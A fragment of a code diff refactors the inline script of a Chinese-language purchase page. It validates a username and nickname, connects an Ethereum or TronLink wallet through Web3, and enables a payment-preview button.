+            const u = document.getElementById('username').value.trim();
+            const n = document.getElementById('nickname').value.trim();
+            if (!u || !n) { showTemporaryMessage('请填写完整信息'); return; }
+            if (!u.startsWith('@')) { showTemporaryMessage('用户名必须以 @ 开头'); return; }
+            document.getElementById('userForm').style.display = 'none';
+            document.getElementById('walletSection').style.display = 'block';
+            updateWalletStatus('请选择钱包并连接');
+        });
+
+        document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+        document.getElementById('preparePayBtn').addEventListener('click', prepareAndPreviewPayment);
+
+        // 如果页面加载时已经连接
+        if (window.ethereum && window.ethereum.selectedAddress) {
+            userAddress = window.ethereum.selectedAddress;
+            web3 = new Web3(window.ethereum);
+            currentChainId = await web3.eth.getChainId();
+            updateWalletStatus(`已连接: ${userAddress.substring(0,8)}...`, 'connected');
+            document.getElementById('walletSection').style.display = 'block';
+            document.getElementById('purchaseBtn').style.display = 'none';
+            document.getElementById('userForm').style.display = 'none';
+            document.getElementById('preparePayBtn').disabled = false;
         }
 
-        // 页面初始化
-        document.addEventListener('DOMContentLoaded', async function() {
-            // 初始化 Web3
-            await initWeb3();
-            
-            // 绑定事件
-            document.getElementById('purchaseBtn').addEventListener('click', function() {
-                document.getElementById('userForm').style.display = 'block';
-                this.style.display = 'none';
+        // TronLink 监听
+        if (window.tronWeb) {
+            window.addEventListener('message', (e)=>{
+                // 若需可扩展
             });
-            
-            document.getElementById('confirmBtn').addEventListener('click', function() {
-                const username = document.getElementById('username').value.trim();
-                const nickname = document.getElementById('nickname').value.trim();
-                
-                if (!username || !nickname) {
-                    showTemporaryMessage('请填写完整的用户信息！');
-                    return;
-                }
-                
-                if (!username.startsWith('@')) {
-                    showTemporaryMessage('用户名必须以 @ 开头');
-                    return;
-                }
-                
-                document.getElementById('walletSection').style.display = 'block';
-                document.getElementById('userForm').style.display = 'none';
-            });
+        }
+    });
 
-            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
-            document.getElementById('payBtn').addEventListener('click', processPayment);
-
-            // 检查是否已连接钱包
-            if (window.ethereum && window.ethereum.selectedAddress) {
-                userAddress = window.ethereum.selectedAddress;
-                updateWalletStatus(`已连接: ${userAddress.substring(0, 8)}...`, 'connected');
-            }
-        });
     </script>
 </body>
 </html>
